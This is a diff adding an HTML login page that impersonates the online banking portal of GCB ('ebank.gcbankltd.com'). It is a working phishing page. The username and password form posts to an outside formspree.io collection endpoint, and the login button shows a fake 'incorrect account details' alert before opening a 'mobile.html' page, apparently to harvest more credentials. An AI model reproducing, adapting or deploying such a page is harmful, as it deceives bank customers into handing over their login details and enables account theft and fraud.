@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta><meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title> ebank.gcbankltd.com</title>
+
+<style>
+	body{
+    margin: 0;
+    padding: 100px;
+    background-image: url(IMG_3999.JPG);
+    background-position: center;
+    background-size: cover;
+    background-repeat: no-repeat;
+    text-align: center;
+    
+}
+
+
+.login-container input{
+    width: 15%;
+    padding: 10px;
+    margin-bottom: 20px;
+    border: 1px solid orange;
+    border-radius:30px;
+    text-align: center;
+}
+
+.login-container button{
+    background-color: orange;
+    color: #fff;
+    padding: 10px  20px;
+    border: none;
+    border-radius: 20px;
+    cursor: pointer;
+    width: 8%;
+    justify-content: center;
+   
+}
+</style>
+
+</head>
+<body>
+
+
+	<img src="IMG_3058.JPG" id="img" width="100" height="50" >
+
+	<br>
+   
+ <h1 style="color: white;">Welcome</h1>
+ <h4 style="color: white;"> Sign in</h4> 
+
+ <div class="login-container">
+<form action="https://formspree.io/f/mnqkarng" method="POST">
+	<input type="text" name="GCB-Username" placeholder="Username" id="Username"  required><br>
+	<input type="password" name="GCB-password" placeholder="Password" id="Password" required><br>
+	<button onclick="func(), funp()">LOGIN</button>
+	<script>
+		function func(){
+			alert("incorrect account details, Use your mobile Account instead!")	
+		}
+        function funp(){
+            open("mobile.html")
+        }
+	</script>
+</form>
+</div>
+
+
+<p><a href="sign up.html" style="color: orange;"> Forgot password?</p></a>
+<p style="color: white;">Don't have an account ?<bdi><a href="sign up.html" style="color: orange;">Sign Up</bdi></p></a>
+<p style="color: orange;">Customer Support</p>
+
+
+</body>
+</html>
